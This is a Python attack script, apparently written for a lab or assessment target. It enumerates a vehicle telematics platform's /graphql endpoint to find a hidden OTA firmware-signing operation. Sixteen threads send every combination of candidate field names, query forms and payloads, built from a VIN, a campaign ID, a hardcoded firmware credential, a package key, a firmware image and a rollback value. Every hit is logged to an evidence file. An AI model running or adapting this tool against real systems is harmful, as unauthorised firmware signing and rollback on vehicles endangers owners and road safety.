#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Stage A: enumerate TSP /graphql root fields for an OTA-signing operation.

Contract we already know (see work/BRIEF_R2.md):
  POST /graphql  {"query": "<text>", "variables": {<keys>}}
  The server is NOT a GraphQL engine - it is a (query-substring, variables-key)
  matcher.  vehicleDiagnostics matches when the query text contains the field
  name AND variables contains "vin" whose value is a registered VIN.
  Anything unmatched returns the guest fallback:
     {"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}

So for every candidate field we try several variable key-sets that a signing
operation would plausibly key on.
"""
import json, os, sys, itertools, hashlib
import requests
from concurrent.futures import ThreadPoolExecutor

URL = "http://10.225.139.2:8080/graphql"
VIN = "CV622697F82A936A1"
CAMP = "CAMP-243892C376D4CB2D5F826953"
CRED = "5e7f07b4a81153ecd5868cc02557f823"
PKGKEY = "3ac02bb40567fa14062cc768e22fefac3dd972aee87a3bf2d01419f026d573d0"
FW = open(os.path.join(os.path.dirname(__file__), "..", "..", "work", "bundle2", "x",
                       "vcu-reference.bin"), "rb").read()
FW_SHA = hashlib.sha256(FW).hexdigest()
FW_B64 = __import__("base64").b64encode(FW).decode()
GUEST = '{"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}'

FIELDS = """
vehicleSign signFirmware otaSign signUpdate vehicleUpdateSign firmwareSign
vehicleCampaign vehicleOta vehiclePackage vehicleVcu vehicleUpdate
vehicleSignature signVehicleFirmware vehicleFirmwareSign otaFirmwareSign
vehicleOtaSign vehicleOtaPackage vehicleOtaCampaign vehicleOtaUpdate
vehicleAuthorization vehicleAuthorize authorizeUpdate authorizeFirmware
updateAuthorization vehicleUpdateAuthorization campaignSign signCampaign
signPackage packageSign firmwareSignature sign otaUpdate otaFirmware
otaPackage otaCampaign vehicle ota vehicles firmware campaign campaigns
vehicleFirmware vehicleFirmwareUpdate firmwareUpdate update updatePackage
vehicleSoftware software softwareUpdate ecuUpdate ecuSign ecuFirmware
vcuSign vcuUpdate vcuPackage vcuFirmware signVcu signVcuFirmware
vehicleVcuSign vehicleVcuUpdate vehicleVcuPackage
release releaseSign signedUpdate signature signatures
vehicleRelease releaseUpdate vehicleReleaseSign
authorizeSign signAuthorize attest attestation quote
vehicleAttestation firmwareAttestation
""".split()

VAR_SETS = []
VAR_SETS.append(("vin", {"vin": VIN}))
VAR_SETS.append(("vin+campaignId", {"vin": VIN, "campaignId": CAMP}))
VAR_SETS.append(("campaignId", {"campaignId": CAMP}))
VAR_SETS.append(("vin+campaignId+rollback", {"vin": VIN, "campaignId": CAMP, "rollback": 2}))
VAR_SETS.append(("vin+rollback", {"vin": VIN, "rollback": 2}))
VAR_SETS.append(("vin+firmware", {"vin": VIN, "firmware": FW_B64}))
VAR_SETS.append(("vin+firmwareHex", {"vin": VIN, "firmwareHex": FW.hex()}))
VAR_SETS.append(("vin+sha256", {"vin": VIN, "sha256": FW_SHA}))
VAR_SETS.append(("vin+image", {"vin": VIN, "image": FW_B64}))
VAR_SETS.append(("vin+campaignId+firmware", {"vin": VIN, "campaignId": CAMP, "firmware": FW_B64}))
VAR_SETS.append(("vin+campaignId+sha256", {"vin": VIN, "campaignId": CAMP, "sha256": FW_SHA}))
VAR_SETS.append(("vin+campaignId+image", {"vin": VIN, "campaignId": CAMP, "image": FW_B64}))
VAR_SETS.append(("vin+size+address", {"vin": VIN, "size": 1024, "address": "0x08040000"}))
VAR_SETS.append(("vin+campaignId+rollback+sha256",
                 {"vin": VIN, "campaignId": CAMP, "rollback": 2, "sha256": FW_SHA}))
VAR_SETS.append(("vin+campaignId+rollback+firmware",
                 {"vin": VIN, "campaignId": CAMP, "rollback": 2, "firmware": FW_B64}))
VAR_SETS.append(("firmware", {"firmware": FW_B64}))
VAR_SETS.append(("sha256", {"sha256": FW_SHA}))
VAR_SETS.append(("packageKey", {"packageKey": PKGKEY}))
VAR_SETS.append(("vin+packageKey", {"vin": VIN, "packageKey": PKGKEY}))
VAR_SETS.append(("all", {"vin": VIN, "campaignId": CAMP, "rollback": 2, "firmware": FW_B64,
                         "sha256": FW_SHA, "size": 1024, "address": "0x08040000",
                         "packageKey": PKGKEY, "firmwareCredential": CRED}))
VAR_SETS.append(("credential", {"vin": VIN, "firmwareCredential": CRED}))
VAR_SETS.append(("input", {"input": {"vin": VIN, "campaignId": CAMP, "rollback": 2,
                                     "firmware": FW_B64}}))
VAR_SETS.append(("request", {"request": {"vin": VIN, "campaignId": CAMP, "rollback": 2,
                                        "firmware": FW_B64}}))

QUERY_FORMS = [
    ("braceless", "{f}"),
    ("nested", "{f{vin}}"),
    ("plain", "f"),
    ("query", "query { f { vin } }"),
    ("mutation", "mutation { f { vin } }"),
    ("sig", "{f(vin:\"%s\", campaignId:\"%s\", rollback:2){signature}}" % (VIN, CAMP)),
]


def body(q, v):
    return json.dumps({"query": q, "variables": v})


def probe(args):
    field, qform, vname, v = args
    q = qform.replace("f", field) if "{f}" in qform else (field if qform == "f" else qform.replace("f", field))
    try:
        r = requests.post(URL, data=body(q, v), headers={"Content-Type": "application/json"}, timeout=10)
        t = r.text.strip()
        if t != GUEST:
            return {"field": field, "query": q, "vars": vname, "status": r.status_code, "resp": t[:1500]}
    except Exception as e:
        return {"field": field, "query": q, "vars": vname, "err": str(e)[:120]}
    return None


def main():
    jobs = []
    # Phase 1: every field with the minimal vin set and one representative query form
    for f in FIELDS:
        jobs.append((f, "{f}", "vin", {"vin": VIN}))
    # Phase 2: every field x every var set with braceless form
    for f in FIELDS:
        for name, v in VAR_SETS:
            if name == "vin":
                continue
            jobs.append((f, "{f}", name, v))
    # Phase 3: the promising sign-ish fields across all query forms
    signish = [f for f in FIELDS if "sign" in f.lower() or "author" in f.lower() or "attest" in f.lower()]
    for f in signish:
        for qn, q in QUERY_FORMS:
            jobs.append((f, q, "vin", {"vin": VIN}))
            jobs.append((f, q, "vin+campaignId+rollback+firmware",
                         dict(VAR_SETS[14][1])))
    print(f"[*] {len(jobs)} probes against {URL}")
    hits = []
    with ThreadPoolExecutor(max_workers=16) as ex:
        for res in ex.map(probe, jobs):
            if res:
                hits.append(res)
                print("[HIT]", json.dumps(res, ensure_ascii=False)[:600], flush=True)
    print(f"[*] done. hits={len(hits)}")
    out = os.path.join(os.path.dirname(__file__), "..", "..", "03_EVIDENCE", "sign", "A_gql_enum.json")
    json.dump({"url": URL, "vin": VIN, "probes": len(jobs), "hits": hits},
              open(os.path.abspath(out), "w"), ensure_ascii=False, indent=2)
    print("[+] ->", os.path.abspath(out))


if __name__ == "__main__":
    main()
